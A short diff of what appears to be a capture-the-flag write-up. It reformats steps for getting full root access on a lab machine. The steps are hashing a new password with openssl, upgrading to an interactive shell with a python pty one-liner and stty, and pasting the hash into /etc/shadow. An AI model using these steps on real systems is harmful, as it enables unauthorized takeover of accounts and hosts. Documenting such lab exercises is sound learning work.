@@ -38,7 +38,7 @@ I tried executing the file, and it worked: </br>
 I was in the root group and could access /root directory and read the root flag, but I wanted full access, so I did this: </br>
 - openssl passwd -6 -salt xyz test -> Generated a hashed password, I used ‘test’. </br>
 - Made an interactive shell, so I could edit it with vim/nano: </br>
-- python3 -c 'import pty; pty.spawn("/bin/bash")' </br>
+A. python3 -c 'import pty; pty.spawn("/bin/bash")' </br>
 B. Ctrl + Z to background my shell, stty raw -echo </br>
 C. stty raw -echo;fg </br>
 - nano /etc/shadow -> pasted the new hashed password to root. </br>
